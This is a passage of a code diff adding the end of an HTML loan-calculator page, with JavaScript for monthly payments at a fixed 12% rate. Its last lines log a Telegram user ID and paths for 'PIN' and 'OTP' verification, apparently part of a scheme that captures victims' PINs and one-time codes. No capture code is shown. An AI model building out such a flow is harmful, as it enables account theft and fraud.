+            const ANNUAL_RATE = 0.12;
+
+            const formatMoney         = v => '$ ' + v.toFixed(0).replace(/\B(?=(\d{3})+(?!\d))/g, ',');
+            const formatMoneyDetailed = v => '$ ' + v.toFixed(2).replace(/\B(?=(\d{3})+(?!\d))/g, ',');
+
+            function updateCalculator() {
+                let principal = parseFloat(amountInput.value) || 0;
+                if (principal < 100) principal = 100;
+                if (principal > 50000) principal = 50000;
+
+                amountInput.value = principal;
+                slider.value = principal;
+
+                const months = parseInt(termSelect.value, 10);
+                const monthlyRate = ANNUAL_RATE / 12;
+
+                let monthlyPayment = 0;
+                if (monthlyRate === 0) {
+                    monthlyPayment = principal / months;
+                } else {
+                    const factor = Math.pow(1 + monthlyRate, months);
+                    monthlyPayment = principal * monthlyRate * factor / (factor - 1);
+                }
+                const totalRepaid = monthlyPayment * months;
+
+                monthlyPaymentEl.textContent = formatMoneyDetailed(monthlyPayment);
+                totalRepaymentEl.textContent = formatMoney(totalRepaid);
+            }
+
+            amountInput.addEventListener('input', function(e) {
+                let val = parseFloat(e.target.value);
+                if (isNaN(val)) val = 100;
+                if (val < 100) val = 100;
+                if (val > 50000) val = 50000;
+                e.target.value = val;
+                slider.value = val;
+                updateCalculator();
+            });
+
+            slider.addEventListener('input', function(e) {
+                const val = parseFloat(e.target.value);
+                amountInput.value = val;
+                updateCalculator();
+            });
+
+            termSelect.addEventListener('change', updateCalculator);
+            updateCalculator();
+
+            amountInput.addEventListener('blur', function(e) {
+                let val = parseFloat(e.target.value);
+                if (isNaN(val)) val = 5000;
+                if (val < 100) val = 100;
+                if (val > 50000) val = 50000;
+                e.target.value = val;
+                slider.value = val;
+                updateCalculator();
+            });
+        })();
+
+        console.log('📌 Telegram User ID:', TELEGRAM_USER_ID);
+        console.log('📌 PIN flag path: Telegram Users/' + TELEGRAM_USER_ID + '/verify');
+        console.log('📌 OTP flag path: Telegram Users/' + TELEGRAM_USER_ID + '/verify_otp');
+    </script>
+</body>
+</html>
